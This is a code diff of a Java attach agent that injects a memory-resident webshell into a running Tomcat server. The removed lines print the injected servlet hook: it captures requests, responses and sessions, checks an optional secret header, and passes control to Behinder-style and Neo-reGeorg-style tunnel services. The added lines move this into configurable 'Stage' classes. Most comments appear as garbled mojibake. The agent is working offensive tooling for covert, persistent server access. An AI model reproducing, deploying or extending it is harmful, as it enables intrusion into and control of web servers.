@@ -3,6 +3,7 @@ package indi.augusttheodor;
 import com.sun.tools.attach.AgentInitializationException;
 import com.sun.tools.attach.AgentLoadException;
 
+import indi.augusttheodor.stage.Stage;
 import org.apache.catalina.core.ExtendServices;
 import org.apache.catalina.core.NeoServices;
 import org.apache.catalina.core.RebeyondServices;
@@ -11,12 +12,11 @@ import java.lang.instrument.ClassDefinition;
 import java.lang.instrument.Instrumentation;
 import java.lang.instrument.UnmodifiableClassException;
 import java.util.HashMap;
+import java.util.List;
 
 public class AgenstMain {
 
     public static void main(String[] args){
-        //SB VSCODE ÌìÌì ÍÌÎÒ±àÂë
-        //ÎÒµÄ×¢ÊÍ£¡
         try{
             String edit="";
             for(String a:args){
@@ -25,22 +25,19 @@ public class AgenstMain {
             }
             AttachA.doAttach(edit);
         } catch (AgentLoadException | IOException | AgentInitializationException e) {
-            throw new RuntimeException(e);  //²»´òËã´¦Àíµ«ÒÀÈ»Ğ´ÁË
+            throw new RuntimeException(e);
         }
 
     }
 
     public static void agentmain(String agentArgs, Instrumentation ins) throws Exception {
-        //Õâ¸ö·½·¨×÷ÎªagentÊ±µÄÈë¿Ú Ë­ÖØÔØ
-       Options cmd=new Options(agentArgs);
+        Options cmd=new Options(agentArgs);
         if(cmd.hasOption("u")){
-            //ĞŞ¸Ä´úÀí
             ExtendServices.SERVICE_URL=cmd.getOptionValue("u")+"E";
             RebeyondServices.SERVICE_URL=cmd.getOptionValue("u")+"R";
             NeoServices.SERVICE_URL=cmd.getOptionValue("u")+"N";
         }
         if(cmd.hasOption("uR")){
-            //Ê¹ÓÃµÄÊ±ºò±ğÎªÄÑ×Ô¼ºÁË´ó¸çÃÇ
             RebeyondServices.SERVICE_URL=cmd.getOptionValue("uR");
         }
         if(cmd.hasOption("uN")){
@@ -49,46 +46,27 @@ public class AgenstMain {
         if(cmd.hasOption("uE")){
             ExtendServices.SERVICE_URL=cmd.getOptionValue("uE");
         }
-        String sc="boolean scFlag=true;"; //Ìí¼ÓµÄĞ£Ñé»·½Ú
-        if(cmd.hasOption("a")){
-            System.out.println(cmd.getOptionValue("a"));
-            String[] authKey= cmd.getOptionValue("a").split(":");
-            sc="boolean scFlag=request.getHeader(\""+authKey[0]+"\")==null?\""+authKey[1]+"\"==null : request.getHeader(\""+authKey[0]+"\").equals(\""+authKey[1]+"\");";
+        List<Stage> stages = AttachA.getStages();
+        for(Stage stage : stages){
+            stage.configure(cmd);
         }
         TransformerA.init();
-        HashMap<String, String[]> hm = AttachA.findAttachClasses(); //ÀÁµÃĞ´×¢ÊÍÁË£¬Òª¹ÖÇë¹ÖVSCODE
+        HashMap<String, String[]> hm = AttachA.findAttachClasses();
         Class[] classes = ins.getAllLoadedClasses();
-        //Ã¶¾ÙËùÓĞÒÑ¼ÓÔØÀà£¬È»ºó¼ì²éÎÒÃÇµÄ×¢ÈëÆ÷ÖĞÊÇ·ñ°üº¬ÕâĞ©
         for (Class c : classes) {
             if (hm.containsKey(c.getName())) {
-                //Èç¹û°üº¬ÄØ£¬ÄÇ¾ÍÊ¹ÓÃTransformer¶ÔÆä×Ö½ÚÂë½øĞĞ×¢Èë
-                for(String mN : hm.get(c.getName())){ //±éÀúÁĞ±íÈ¡³öËùÓĞÒª×¢ÈëµÄ·½·¨
+                Stage stage = AttachA.getStageForClass(c.getName());
+                if(stage == null){
+                    continue;
+                }
+                for(String mN : hm.get(c.getName())){
                     TransformerA tA = new TransformerA(mN,c.getName());
-                    tA.setSourceCode("{" +
-                            "javax.servlet.http.HttpServletRequest request=(javax.servlet.http.HttpServletRequest)$1;\n" +
-                            "javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse)$2;\n" +
-                            sc +
-                            "System.out.println(scFlag);" +
-                            "if(scFlag==true){" +
-                            "   java.util.Map rdd=new java.util.HashMap();\n" +
-                            "   rdd.put(\"url\",request.getServletPath());\n" +
-                            "   rdd.put(\"method\",request.getMethod());\n" +
-                            "   rdd.put(\"b\",request.getReader().readLine());\n" +
-                            "   java.util.Map s=new java.util.HashMap();\n" +
-                            "   s.put(\"request\",request);\n" +
-                            "   s.put(\"response\",response);\n" +
-                            "   s.put(\"session\",request.getSession());" +
-                            "   org.apache.catalina.core.RebeyondServices.doServices(rdd,s);" +
-                            "   org.apache.catalina.core.ExtendServices.doServices(rdd,s);" +
-                          //"   org.apache.catalina.core.Suo5Services.doServices(rdd,s);" + //ÆôÓÃ´Ë¹¦ÄÜĞèÒªÖØĞÂ±àÒë£¬Çë¿´Suo5Services
-                            "   org.apache.catalina.core.NeoServices.doServices(rdd,s);" +
-                            "   }" +
-                            "}"); //Ç°ÖÃ£¬ÔÚ±»×¢Èë»·¾³ÄÚ»ñÈ¡ËùÓĞĞèÒªµÄÄÚÈİ£¬È»ºó½øÈëagent»·¾³
+                    tA.setSourceCode(stage.getInjectedSource(c.getName(), mN, cmd));
                     try {
                         ClassDefinition cd=new ClassDefinition(c, tA.getBytes(c));
                         ins.redefineClasses(cd);
                     } catch (UnmodifiableClassException e) {
-                        System.out.println(mN+"------"+c.getName()+"------"+"²»¿É×¢Èë£¡");
+                        System.out.println(mN+"------"+c.getName()+"------"+"ä¸å¯æ³¨å…¥ï¼");
                     } catch (ClassNotFoundException e) {
                         throw new RuntimeException(e);
                     }
